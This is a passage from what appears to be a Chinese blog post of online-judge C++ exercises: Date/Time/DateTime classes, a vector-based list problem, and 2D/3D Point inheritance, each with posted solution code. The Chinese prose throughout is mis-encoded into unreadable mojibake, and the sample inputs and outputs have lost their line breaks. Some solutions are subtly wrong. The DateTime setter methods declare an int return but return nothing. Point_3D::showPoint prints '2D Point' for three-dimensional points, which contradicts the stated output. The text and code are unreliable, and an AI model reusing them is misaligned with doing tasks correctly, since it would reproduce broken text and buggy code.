<p>Time::Time(int,int,int)æ„é€ æ–¹æ³•ï¼šä¼ å…¥çš„å‚æ•°ä¾æ¬¡ä¸ºæ—¶åˆ†ç§’ï¼Œç”¨å‚æ•°å°†æ—¶é—´åˆå§‹åŒ–ã€‚</p>
<p>åœ¨Timeç±»çš„æ„é€ å‡½æ•°ä¸­è¾“å‡ºï¼šâ€œCREATE Time : (h, m, s)â€ï¼Œå…¶ä¸­hã€mã€sä¸ºåˆå§‹åŒ–å¯¹è±¡æ—¶çš„æ—¶åˆ†ç§’å€¼ã€‚å‚è§è¾“å‡º</p>
<p>Time::Time(const Time&amp;)æ„é€ æ–¹æ³•ï¼šæ‹·è´æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–å¯¹è±¡ã€‚</p>
<p>åœ¨æ‹·è´æ„é€ å‡½æ•°ä¸­è¾“å‡ºï¼šâ€œCOPY   Time : (h, m, s)â€ï¼Œå…¶ä¸­hã€mã€sä¸ºåˆå§‹åŒ–å¯¹è±¡æ—¶çš„æ—¶åˆ†ç§’å€¼ã€‚å‚è§è¾“å‡º</p>
<p>Time::showTime()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºTimeå¯¹è±¡ã€‚</p>
<p>Time::setTime(int,int,int)æ–¹æ³•ï¼šä¼ å…¥çš„å‚æ•°ä¾æ¬¡ä¸ºæ—¶åˆ†ç§’ï¼Œç”¨å‚æ•°ä¿®æ”¹å¯¹è±¡çš„å±æ€§å€¼</p>
<p>-â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-</p>
<p>ä½ è®¾è®¡DateTimeç±»ã€Dateç±»å’ŒTimeç±»ï¼Œä½¿å¾—main()å‡½æ•°èƒ½å¤Ÿæ­£ç¡®è¿è¡Œã€‚</p>
<p>å‡½æ•°è°ƒç”¨æ ¼å¼è§append.ccã€‚</p>
<p>append.ccä¸­å·²ç»™å‡ºmain()å‡½æ•°ã€‚</p>
<h2 id="Input-36"><a href="#Input-36" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºæœ‰nç»„æµ‹è¯•æ•°æ®ã€‚</p>
<p>åé¢çš„è¾“å…¥æ¯è¡Œä¸ºä¸€ç»„æµ‹è¯•æ•°æ®ã€‚æ¯ç»„æµ‹è¯•æ•°æ®çš„å‰3ä¸ªæ•´æ•°æ˜¯æ—¥æœŸçš„å¹´æœˆæ—¥ï¼Œå3ä¸ªæ•´æ•°æ˜¯æ—¶é—´çš„æ—¶åˆ†ç§’ã€‚</p>
<h2 id="Output-36"><a href="#Output-36" class="headerlink" title="Output"></a>Output</h2><p>æ¯ç»„æµ‹è¯•æ•°æ®å¯¹åº”ä¸€è¡Œè¾“å‡ºã€‚æ—¥æœŸçš„è¾“å‡ºæ ¼å¼ä¸ºâ€œyyyy-mm-ddâ€ï¼Œæ—¶é—´çš„è¾“å‡ºæ ¼å¼ä¸ºâ€œhh:mm:ssâ€ï¼Œä¸­é—´ç”¨ä¸€ä¸ªç©ºæ ¼åˆ†å¼€ã€‚</p>
<h2 id="Sample-Input-36"><a href="#Sample-Input-36" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>31982 10 1 0 0 02000 2 28 23 59 592014 7 2 13 30 01</p>
<h2 id="Sample-Output-36"><a href="#Sample-Output-36" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>CREATE Date : (1000, 10, 10)COPY   Date : (1000, 10, 10)CREATE Time : (1, 1, 1)COPY   Time : (1, 1, 1)COPY   Time : (1, 1, 1)COPY   Date : (1000, 10, 10)CREATE DateTime : (1000, 10, 10) (1, 1, 1)COPY   Time : (1, 1, 1)COPY   Date : (1000, 10, 10)COPY   DateTime : (1000, 10, 10) (1, 1, 1)DateTime : 1000 10 10 1 1 11982-10-01 00:00:002000-02-28 23:59:592014-07-02 13:30:01</p>
<h2 id="HINT-36"><a href="#HINT-36" class="headerlink" title="HINT"></a>HINT</h2><p>è¾“å‡ºæ ¼å¼ç”¨å¤´æ–‡ä»¶<iomanip>ä¸­æµæ“ä½œç®—å­ï¼š</p>
<p>setw(w)   ï¼šè®¾ç½®æ•°æ®çš„è¾“å‡ºå®½åº¦ä¸ºwä¸ªå­—ç¬¦</p>
<p>setfill(c)ï¼šè®¾ç½®ç”¨å­—ç¬¦cä½œä¸ºå¡«å……å­—ç¬¦</p>
<h2 id="Append-Code-36"><a href="#Append-Code-36" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1577&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;  
#include &lt;algorithm&gt;  
#include &lt;iomanip&gt;  
using namespace std;  


class Time&#123;  
   private:  
      friend class DateTime;  
      int hh,mm,ss;  
   public:  
      Time():hh(0),mm(0),ss(0)&#123;  
          cout&lt;&lt;&quot;CREATE Time : (&quot;&lt;&lt;hh&lt;&lt;&quot;, &quot;&lt;&lt;mm&lt;&lt;&quot;, &quot;&lt;&lt;ss&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
      &#125;  
      Time(int a,int b,int c):hh(a),mm(b),ss(c)&#123;  
           cout&lt;&lt;&quot;CREATE Time : (&quot;&lt;&lt;hh&lt;&lt;&quot;, &quot;&lt;&lt;mm&lt;&lt;&quot;, &quot;&lt;&lt;ss&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
      &#125;  
      Time(const Time &amp;p):hh(p.hh),mm(p.mm),ss(p.ss)&#123;  
          cout&lt;&lt;&quot;COPY   Time : (&quot;&lt;&lt;hh&lt;&lt;&quot;, &quot;&lt;&lt;mm&lt;&lt;&quot;, &quot;&lt;&lt;ss&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
      &#125;  
      Time &amp;setTime(int a,int b,int c)&#123;hh=a;mm=b;ss=c;return *this;&#125;  
      void showTime()&#123;  
        cout&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;hh&lt;&lt;&quot;:&quot;&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;mm&lt;&lt;&quot;:&quot;&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;ss;  
      &#125;  
      ~Time()&#123;&#125;  
&#125;;  

class Date&#123;  
   private:  
       friend class DateTime;  
       int year,month,day;  
   public:  
       Date():year(1),month(1),day(1)&#123;  
           cout&lt;&lt;&quot;CREATE Date : (&quot;&lt;&lt;year&lt;&lt;&quot;, &quot;&lt;&lt;month&lt;&lt;&quot;, &quot;&lt;&lt;day&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
       &#125;  
       Date(const Date &amp;p):year(p.year),month(p.month),day(p.day)&#123;  

          cout&lt;&lt;&quot;COPY   Date : (&quot;&lt;&lt;year&lt;&lt;&quot;, &quot;&lt;&lt;month&lt;&lt;&quot;, &quot;&lt;&lt;day&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
      &#125;  
       Date(int a,int b,int c):year(a),month(b),day(c)&#123;  
          cout&lt;&lt;&quot;CREATE Date : (&quot;&lt;&lt;year&lt;&lt;&quot;, &quot;&lt;&lt;month&lt;&lt;&quot;, &quot;&lt;&lt;day&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
       &#125;  
       Date &amp;setDate(int a,int b,int c)&#123;year=a;month=b;day=c;return *this;&#125;  
       void showDate() &#123;  
           cout&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;setw(4)&lt;&lt;year&lt;&lt;&quot;-&quot;&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;setw(2)&lt;&lt;month&lt;&lt;&quot;-&quot;&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;setw(2)&lt;&lt;day&lt;&lt;&quot; &quot;;  
       &#125;  
       ~Date()&#123;&#125;  
&#125;;  



class DateTime&#123;  
   private:  
       friend class Date;  
       friend class Time;  
       Time T;  
       Date D;  
       int year1,month1,day1,hh1,mm1,ss1;  
   public:  
       DateTime()&#123;  
         cout&lt;&lt;&quot;CREATE DateTime : (&quot;&lt;&lt;D.year&lt;&lt;&quot;, &quot;&lt;&lt;D.month&lt;&lt;&quot;, &quot;&lt;&lt;D.day&lt;&lt;&quot;, &quot;&lt;&lt;T.hh&lt;&lt;&quot;, &quot;&lt;&lt;T.mm&lt;&lt;&quot;, &quot;&lt;&lt;T.ss&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
       &#125;  
       DateTime(const Date&amp; d,const Time&amp; t):D(d),T(t)&#123;  
         cout&lt;&lt;&quot;CREATE DateTime : (&quot;&lt;&lt;D.year&lt;&lt;&quot;, &quot;&lt;&lt;D.month&lt;&lt;&quot;, &quot;&lt;&lt;D.day&lt;&lt;&quot;) (&quot;&lt;&lt;T.hh&lt;&lt;&quot;, &quot;&lt;&lt;T.mm&lt;&lt;&quot;, &quot;&lt;&lt;T.ss&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
       &#125;  
       DateTime(const DateTime&amp; p):T(p.T),D(p.D)&#123;  
        cout&lt;&lt;&quot;COPY   DateTime : (&quot;&lt;&lt;D.year&lt;&lt;&quot;, &quot;&lt;&lt;D.month&lt;&lt;&quot;, &quot;&lt;&lt;D.day&lt;&lt;&quot;) (&quot;&lt;&lt;T.hh&lt;&lt;&quot;, &quot;&lt;&lt;T.mm&lt;&lt;&quot;, &quot;&lt;&lt;T.ss&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
       &#125;  
       DateTime(int a,int b,int c,int d,int e,int f):D(a,b,c),T(d,e,f)&#123;  
       &#125;  
       int const year(int year1)&#123;D.year=year1;&#125;  
       int const year() const &#123;return D.year;&#125;  
       int const month(int month1)&#123;D.month=month1;&#125;  
       int const month() const&#123;return D.month;&#125;  
       int const day(int day1)&#123;D.day=day1;&#125;  
       int const day() const&#123;return D.day;&#125;  
       int const hour(int hh1)&#123;T.hh=hh1;&#125;  
       int const hour() const&#123;return T.hh;&#125;  
       int const minute(int mm1)&#123;T.mm=mm1;&#125;  
       int const minute() const&#123;return T.mm;&#125;  
       int const second(int ss1)&#123;T.ss=ss1;&#125;  
       int const second() const&#123;return T.ss;&#125;  
       void showDateTime()&#123;  
         D.showDate();  T.showTime();  
       &#125;  
       DateTime &amp;setDateTime(int a,int b,int c,int d,int e,int f)&#123;  
           D.setDate(a,b,c);T.setTime(d,e,f);return *this;  
       &#125;  
       ~DateTime()&#123;&#125;  
&#125;;  

int main()  
&#123;  
    const Date date(1000, 10, 10), dt(date);  
    const Time time(1, 1, 1), tm(time);  
    DateTime date_time(dt, tm);  
    const DateTime cnt(date_time);  
    cout &lt;&lt; &quot;DateTime : &quot; &lt;&lt; cnt.year() &lt;&lt; &quot; &quot; &lt;&lt; cnt.month() &lt;&lt; &quot; &quot; &lt;&lt; cnt.day();  
    cout &lt;&lt; &quot; &quot; &lt;&lt; cnt.hour() &lt;&lt; &quot; &quot; &lt;&lt; cnt.minute() &lt;&lt; &quot; &quot; &lt;&lt; cnt.second();  
    cout &lt;&lt; endl;  
    int cases;  
    cin &gt;&gt; cases;  
    for(int ca = 0; ca &lt; cases; ca++)  
    &#123;  
        int year, month, day;  
        cin &gt;&gt; year &gt;&gt; month &gt;&gt; day;  
        int hour, minute, second;  
        cin &gt;&gt; hour &gt;&gt; minute &gt;&gt; second;  
        date_time.year(year);  
        date_time.month(month);  
        date_time.day(day);  
        date_time.hour(hour);  
        date_time.minute(minute);  
        date_time.second(second);  
        date_time.showDateTime();  
        cout &lt;&lt; endl;  
    &#125;  
&#125;  </code></pre>
<h3 id="38-STLâ€”â€”çµæ´»çš„çº¿æ€§è¡¨"><a href="#38-STLâ€”â€”çµæ´»çš„çº¿æ€§è¡¨" class="headerlink" title="38.STLâ€”â€”çµæ´»çš„çº¿æ€§è¡¨"></a>38.STLâ€”â€”çµæ´»çš„çº¿æ€§è¡¨</h3><blockquote>
<h2 id="Description-37"><a href="#Description-37" class="headerlink" title="Description"></a>Description</h2><p>æ•°ç»„å’Œé“¾è¡¨æ˜¯æˆ‘ä»¬ç†ŸçŸ¥çš„ä¸¤ç§çº¿æ€§ç»“æ„ï¼Œä½†æ˜¯å®ƒä»¬ä¸å¤Ÿçµæ´»ï¼ˆä¸èƒ½åŒæ—¶å®ç°ç›´æ¥æ’å…¥ã€åˆ é™¤å’Œè®¿é—®æ“ä½œï¼‰ï¼Œç»™ä½ è‹¥å¹²ç§æ“ä½œï¼Œä½ èƒ½é€šè¿‡ä¸€ç§çµæ´»çš„å®¹å™¨ï¼Œå®ç°å®ƒä»¬çš„åŠŸèƒ½å—ï¼Ÿ</p>
<p>æ“ä½œ1ï¼šBuild a b ï¼ˆäº§ç”Ÿä¸€ä¸ªå¤§å°ä¸ºaçš„çº¿æ€§è¡¨ï¼Œå…¶å€¼å…¨éƒ¨èµ‹ä¸ºbï¼Œæ¯ç»„æ ·ä¾‹ä»…å‡ºç°ä¸€æ¬¡ï¼Œåœ¨èµ·å§‹è¡Œï¼‰</p>
<p>æ“ä½œ2ï¼šModify a b ï¼ˆå°†çº¿æ€§è¡¨çš„ç¬¬aä¸ªå…ƒç´ çš„å€¼è®¾ä¸ºbï¼‰</p>
<p>æ“ä½œ3ï¼šInsert a b c ï¼ˆåœ¨çº¿æ€§è¡¨çš„ç¬¬aä¸ªä½ç½®æ’å…¥ç¬¬båˆ°ç¬¬cä¸ªä½ç½®çš„æ‰€æœ‰å…ƒç´ ï¼‰</p>
<p>æ“ä½œ4ï¼šErase a bï¼ˆåˆ é™¤çº¿æ€§è¡¨ç¬¬aåˆ°ç¬¬bä¸ªä½ç½®çš„æ‰€æœ‰å…ƒç´ ï¼‰</p>
<p>æ“ä½œ5ï¼šPrint a b ï¼ˆè¾“å‡ºçº¿æ€§è¡¨çš„ç¬¬aåˆ°ç¬¬bä¸ªå…ƒç´ ï¼‰</p>
<p>ç¨‹åºåœ¨æ‰§è¡Œæ“ä½œ5çš„æ—¶å€™è¦è¾“å‡ºç»“æœï¼Œæ ¼å¼å¦‚â€œ[1]:3 [2]:4 [3]:5â€ï¼ˆ[]å†…ä¸ºçº¿æ€§è¡¨çš„ä½ç½®ï¼Œâ€œ:â€åé¢ä¸ºå…ƒç´ çš„å€¼ï¼Œä¸å¸¦å¼•å·ï¼Œæ¯ç»„è¾“å‡ºå ä¸€è¡Œï¼‰</p>
<h2 id="Input-37"><a href="#Input-37" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥æœ‰å¤šè¡Œï¼Œå¯¹åº”5ä¸ªæ“ä½œï¼Œä»¥EOFç»“æŸ</p>
<h2 id="Output-37"><a href="#Output-37" class="headerlink" title="Output"></a>Output</h2><p>è§Sample</p>
<h2 id="Sample-Input-37"><a href="#Sample-Input-37" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>Build 10 1Modify 2 2Insert 3 1 2Modify 6 4Erase 3 5Print 1 8</p>
<h2 id="Sample-Output-37"><a href="#Sample-Output-37" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>[1]:1 [2]:2 [3]:4 [4]:1 [5]:1 [6]:1 [7]:1 [8]:1</p>
<h2 id="HINT-37"><a href="#HINT-37" class="headerlink" title="HINT"></a>HINT</h2><p><a href="">ï»¿</a>ä½¿ç”¨vectorå¯ä»¥å¾ˆå®¹æ˜“è§£å†³</p>
<h2 id="Append-Code-37"><a href="#Append-Code-37" class="headerlink" title="Append Code"></a>Append Code</h2></blockquote>
<pre><code>#include &lt;iostream&gt;  
#include &lt;vector&gt;  
#include &lt;string&gt;  
using namespace std;  
int main()  
&#123;  
   string l;  
   int a,b,c;  
   vector&lt;int&gt; s;  
   while(cin&gt;&gt;l)&#123;  
    if(l==&quot;Build&quot;)&#123;cin&gt;&gt;a&gt;&gt;b;s.assign(a,b);&#125;  
    else if(l==&quot;Modify&quot;)&#123;cin&gt;&gt;a&gt;&gt;b;s[a-1]=b;&#125;  
    else if(l==&quot;Insert&quot;)&#123;cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;s.insert(s.begin()+a-1,s.begin()+b-1,s.begin()+c);&#125;  
    else if(l==&quot;Erase&quot;)&#123;cin&gt;&gt;a&gt;&gt;b;s.erase(s.begin()+a-1,s.begin()+b);&#125;  
    else if(l==&quot;Print&quot;)&#123;  
        cin&gt;&gt;a&gt;&gt;b;  
        int i;  
        for(i=a-1;i&lt;b;i++)  
        &#123;  
            if(i!=b-1)  
                cout&lt;&lt;&quot;[&quot;&lt;&lt;i+1&lt;&lt;&quot;]&quot;&lt;&lt;&quot;:&quot;&lt;&lt;s[i]&lt;&lt;&quot; &quot;;  
            else  
                cout&lt;&lt;&quot;[&quot;&lt;&lt;i+1&lt;&lt;&quot;]&quot;&lt;&lt;&quot;:&quot;&lt;&lt;s[i]&lt;&lt;endl;  
        &#125;  

    &#125;  
   &#125;  
   return 0;  
&#125;  </code></pre>
<blockquote>
<p>STLä¸­vectorå®¹å™¨ç”¨æ³•</p>
<p><a href="http://www.cnblogs.com/ziyi--caolu/archive/2013/07/04/3170928.html">http://www.cnblogs.com/ziyi--caolu/archive/2013/07/04/3170928.html</a></p>
<p><a href="http://www.cnblogs.com/zhonghuasong/p/5975979.html">http://www.cnblogs.com/zhonghuasong/p/5975979.html</a></p>
<p><a href="http://blog.csdn.net/xlm289348/article/details/8166820">http://blog.csdn.net/xlm289348/article/details/8166820</a></p>
<p><a href="http://blog.csdn.net/liuweiyuxiang/article/details/52735561">http://blog.csdn.net/liuweiyuxiang/article/details/52735561</a></p>
<blockquote>
<p><strong>3. vectoråŸºæœ¬æ“ä½œ</strong></p>
<p>(1). å®¹é‡</p>
<ul>
<li>å‘é‡å¤§å°ï¼š vec.size();</li>
<li>å‘é‡æœ€å¤§å®¹é‡ï¼š vec.max_size();</li>
<li>æ›´æ”¹å‘é‡å¤§å°ï¼š vec.resize();</li>
<li>å‘é‡çœŸå®å¤§å°ï¼š vec.capacity();</li>
<li>å‘é‡åˆ¤ç©ºï¼š vec.empty();</li>
<li>å‡å°‘å‘é‡å¤§å°åˆ°æ»¡è¶³å…ƒç´ æ‰€å å­˜å‚¨ç©ºé—´çš„å¤§å°ï¼š vec.shrink_to_fit(); //<a href="http://www.cplusplus.com/reference/vector/vector/shrink_to_fit/">shrink_to_fit</a></li>
</ul>
<p>(2). ä¿®æ”¹</p>
<ul>
<li>å¤šä¸ªå…ƒç´ èµ‹å€¼ï¼š vec.assign(); //ç±»ä¼¼äºåˆå§‹åŒ–æ—¶ç”¨æ•°ç»„è¿›è¡Œèµ‹å€¼</li>
<li>æœ«å°¾æ·»åŠ å…ƒç´ ï¼š vec.push_back();</li>
<li>æœ«å°¾åˆ é™¤å…ƒç´ ï¼š vec.pop_back();</li>
<li>ä»»æ„ä½ç½®æ’å…¥å…ƒç´ ï¼š vec.insert();</li>
<li>ä»»æ„ä½ç½®åˆ é™¤å…ƒç´ ï¼š vec.erase();</li>
<li>äº¤æ¢ä¸¤ä¸ªå‘é‡çš„å…ƒç´ ï¼š vec.swap();</li>
<li>æ¸…ç©ºå‘é‡å…ƒç´ ï¼š vec.clear();</li>
</ul>
<p>(3)è¿­ä»£å™¨</p>
<ul>
<li>å¼€å§‹æŒ‡é’ˆï¼švec.begin();</li>
<li>æœ«å°¾æŒ‡é’ˆï¼švec.end(); //æŒ‡å‘æœ€åä¸€ä¸ªå…ƒç´ çš„ä¸‹ä¸€ä¸ªä½ç½®</li>
<li>æŒ‡å‘å¸¸é‡çš„å¼€å§‹æŒ‡é’ˆï¼š vec.cbegin(); //æ„æ€å°±æ˜¯ä¸èƒ½é€šè¿‡è¿™ä¸ªæŒ‡é’ˆæ¥ä¿®æ”¹æ‰€æŒ‡çš„å†…å®¹ï¼Œä½†è¿˜æ˜¯å¯ä»¥é€šè¿‡å…¶ä»–æ–¹å¼ä¿®æ”¹çš„ï¼Œè€Œä¸”æŒ‡é’ˆä¹Ÿæ˜¯å¯ä»¥ç§»åŠ¨çš„ã€‚</li>
<li>æŒ‡å‘å¸¸é‡çš„æœ«å°¾æŒ‡é’ˆï¼š vec.cend();</li>
</ul>
<p>(4)å…ƒç´ çš„è®¿é—®</p>
<ul>
<li>ä¸‹æ ‡è®¿é—®ï¼š vec[1]; //å¹¶ä¸ä¼šæ£€æŸ¥æ˜¯å¦è¶Šç•Œ</li>
<li>atæ–¹æ³•è®¿é—®ï¼š vec.at(1); //ä»¥ä¸Šä¸¤è€…çš„åŒºåˆ«å°±æ˜¯atä¼šæ£€æŸ¥æ˜¯å¦è¶Šç•Œï¼Œæ˜¯åˆ™æŠ›å‡ºout of rangeå¼‚å¸¸</li>
<li>è®¿é—®ç¬¬ä¸€ä¸ªå…ƒç´ ï¼š vec.front();</li>
<li>è®¿é—®æœ€åä¸€ä¸ªå…ƒç´ ï¼š vec.back();</li>
<li>è¿”å›ä¸€ä¸ªæŒ‡é’ˆï¼š int* p = vec.data(); //å¯è¡Œçš„åŸå› åœ¨äºvectoråœ¨å†…å­˜ä¸­å°±æ˜¯ä¸€ä¸ªè¿ç»­å­˜å‚¨çš„æ•°ç»„ï¼Œæ‰€ä»¥å¯ä»¥è¿”å›ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘è¿™ä¸ªæ•°ç»„ã€‚è¿™æ˜¯æ˜¯C++11çš„ç‰¹æ€§ã€‚</li>
</ul>
</blockquote>
</blockquote>
<h3 id="39-ç«‹ä½“ç©ºé—´ä¸­çš„ç‚¹ï¼ˆIï¼‰"><a href="#39-ç«‹ä½“ç©ºé—´ä¸­çš„ç‚¹ï¼ˆIï¼‰" class="headerlink" title="39.ç«‹ä½“ç©ºé—´ä¸­çš„ç‚¹ï¼ˆIï¼‰"></a>39.ç«‹ä½“ç©ºé—´ä¸­çš„ç‚¹ï¼ˆIï¼‰</h3><blockquote>
<h2 id="Description-38"><a href="#Description-38" class="headerlink" title="Description"></a>Description</h2><p>è®¾è®¡ä¸€ä¸ªå¹³é¢ä¸Šçš„ç‚¹Pointç±»å’Œ3ç»´çš„ç‚¹Point_3Dç±»ï¼Œæ»¡è¶³Point_3Dç±»ç»§æ‰¿è‡ªPointç±»ï¼Œç”¨äºè¯»å–è¾“å…¥çš„æ•°æ®ï¼Œè¾“å‡ºæ‰€æ„é€ çš„ä¸¤ç§ç‚¹çš„åæ ‡ã€‚</p>
<p>è®¾è®¡Pointç±»éœ€æ”¯æŒä¸€ä¸‹æ“ä½œï¼š</p>
<p>Point::Point()æ— å‚æ„é€ ã€‚</p>
<p>Point::Point(double,double)ä¸¤ä¸ªåæ ‡å‚æ•°æ„é€ ã€‚</p>
<p>Point::showPoint()æŒ‰æ ¼å¼è¾“å‡ºPointå¯¹è±¡</p>
<p>è®¾è®¡Point_3Dç±»éœ€æ”¯æŒä¸€ä¸‹æ“ä½œï¼š</p>
<p>Point_3D::Point_3D()æ— å‚æ„é€ ã€‚</p>
<p>Point_3D::Point_3D(double,double,double)ä¸‰ä¸ªåæ ‡å‚æ•°æ„é€ ã€‚</p>
<p>Point_3D::showPoint()æŒ‰æ ¼å¼è¾“å‡ºPoint_3Då¯¹è±¡ã€‚</p>
<p>-â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-</p>
<p>ä½ è®¾è®¡Pointç±»å’ŒPoint_3Dç±»ï¼Œä½¿å¾—main()å‡½æ•°èƒ½å¤Ÿæ­£ç¡®è¿è¡Œã€‚</p>
<p>å‡½æ•°è°ƒç”¨æ ¼å¼è§append.ccã€‚</p>
<p>append.ccä¸­å·²ç»™å‡ºmain()å‡½æ•°ã€‚</p>
<h2 id="Input-38"><a href="#Input-38" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºæœ‰nç»„æµ‹è¯•æ•°æ®ï¼Œåé¢çš„è¾“å…¥æ¯è¡Œä¸ºä¸€ç»„æµ‹è¯•æ•°æ®ã€‚æ¯ç»„æµ‹è¯•æ•°æ®çš„ç¬¬ä¸€è¡Œæ˜¯ä¸€ä¸ªæ•´æ•°mï¼Œmæœ‰ä¸¤ç§å–å€¼ï¼š2ã€3ï¼›mä¸º2æ—¶ï¼Œåé¢æœ‰ä¸¤ä¸ªæµ®ç‚¹æ•°xã€yï¼Œè¡¨ç¤ºä¸€ä¸ªå¹³é¢ä¸Šçš„ç‚¹çš„åæ ‡(x,y)ï¼›mä¸º3æ—¶åé¢æœ‰3ä¸ªæµ®ç‚¹æ•°xã€yã€zï¼Œè¡¨ç¤ºä¸€ä¸ª3ç»´çš„ç‚¹çš„åæ ‡(x,y,z)ã€‚</p>
<h2 id="Output-38"><a href="#Output-38" class="headerlink" title="Output"></a>Output</h2><p>æ¯ç»„æµ‹è¯•æ•°æ®å¯¹åº”ä¸€è¡Œè¾“å‡ºã€‚</p>
<p>è‹¥è¾“å…¥ä¸ºå¹³é¢ä¸Šçš„ç‚¹ï¼Œåˆ™è¾“å‡ºï¼šâ€œ2D Point (x,y)â€ï¼Œxå’Œyä¸ºè¾“å…¥çš„åæ ‡å€¼ã€‚</p>
<p>è‹¥è¾“å…¥ä¸º3ç»´çš„ç‚¹ï¼Œåˆ™è¾“å‡ºï¼šâ€œ3D Point (x,y,y)â€ï¼Œxã€yå’Œzä¸ºè¾“å…¥çš„åæ ‡å€¼ã€‚</p>
<h2 id="Sample-Input-38"><a href="#Sample-Input-38" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>53 1 2 33 0 0 02 -1 13 -1 -1 -12 0 0</p>
<h2 id="Sample-Output-38"><a href="#Sample-Output-38" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>3D Point (1,2,3)3D Point (0,0,0)2D Point (-1,1)3D Point (-1,-1,-1)2D Point (0,0)</p>
<h2 id="HINT-38"><a href="#HINT-38" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-38"><a href="#Append-Code-38" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1571&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Point&#123;
public:
    double a,b;
    Point()&#123;&#125;
    Point(double aa,double bb):a(aa),b(bb)&#123;&#125;
    void showPoint()&#123;cout &lt;&lt; &quot;2D Point (&quot; &lt;&lt; a &lt;&lt; &quot;,&quot; &lt;&lt; b &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
&#125;;
class Point_3D:public Point&#123;
public:
    double c;
    Point_3D()&#123;&#125;
    Point_3D(double aa,double bb,double cc):Point(aa,bb),c(cc)&#123;&#125;
    void showPoint()&#123;cout &lt;&lt; &quot;2D Point (&quot; &lt;&lt; a &lt;&lt; &quot;,&quot; &lt;&lt; b &lt;&lt; &quot;,&quot; &lt;&lt; c &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
&#125;;
////////////////////
int main()
&#123;
    int cases;
    cin&gt;&gt;cases;
    for(int i = 1; i &lt;= cases; i++)
    &#123;
        double x, y, z;
        int point_type;
        cin&gt;&gt;point_type;
        if(point_type == 2)
        &#123;
            cin&gt;&gt;x&gt;&gt;y;
            Point p(x, y);
            p.showPoint();
        &#125;
        if(point_type == 3)
        &#123;
            cin&gt;&gt;x&gt;&gt;y&gt;&gt;z;
            Point_3D p(x, y, z);
            p.showPoint();
        &#125;
    &#125;
&#125;</code></pre>
<blockquote>
<p>C++ç»§æ‰¿çš„æ¦‚å¿µåŠè¯­æ³•</p>
<p><a href="http://www.weixueyuan.net/view/6358.html">http://www.weixueyuan.net/view/6358.html</a></p>
</blockquote>
<h3 id="40-ç«‹ä½“ç©ºé—´ä¸­çš„ç‚¹ï¼ˆIIï¼‰"><a href="#40-ç«‹ä½“ç©ºé—´ä¸­çš„ç‚¹ï¼ˆIIï¼‰" class="headerlink" title="40.ç«‹ä½“ç©ºé—´ä¸­çš„ç‚¹ï¼ˆIIï¼‰"></a>40.ç«‹ä½“ç©ºé—´ä¸­çš„ç‚¹ï¼ˆIIï¼‰</h3><blockquote>
<h2 id="Description-39"><a href="#Description-39" class="headerlink" title="Description"></a>Description</h2><p>è®¾è®¡ä¸€ä¸ªå¹³é¢ä¸Šçš„ç‚¹Pointç±»å’Œ3ç»´çš„ç‚¹Point_3Dç±»ï¼Œæ»¡è¶³Point_3Dç±»ç»§æ‰¿è‡ªPointç±»ï¼Œç”¨äºè¯»å–è¾“å…¥çš„æ•°æ®ï¼Œè¾“å‡ºæ‰€æ„é€ çš„ä¸¤ç§ç‚¹çš„åæ ‡ã€‚å¹¶ç»Ÿè®¡è¾“å…¥çš„ä¸¤ç§ç‚¹çš„ä¸ªæ•°ã€‚</p>
<p>è®¾è®¡Pointç±»éœ€æ”¯æŒä¸€ä¸‹æ“ä½œï¼š</p>
<p>Point::Point()æ— å‚æ„é€ ã€‚</p>
<p>Point::Point(double,double)ä¸¤ä¸ªåæ ‡å‚æ•°æ„é€ ã€‚</p>
<p>Point::x()è¿”å›xåæ ‡</p>
<p>Point::y()è¿”å›yåæ ‡</p>
<p>Point::x(int)ä¿®æ”¹xåæ ‡å¹¶è¿”å›</p>
<p>Point::y(int)ä¿®æ”¹yåæ ‡å¹¶è¿”å›</p>
<p>Point::showPoint()æŒ‰æ ¼å¼è¾“å‡ºPointå¯¹è±¡</p>
<p>Point::showNumber()è¿”å›Pointå¯¹è±¡æ€»æ•°çš„é™æ€å‡½æ•°</p>
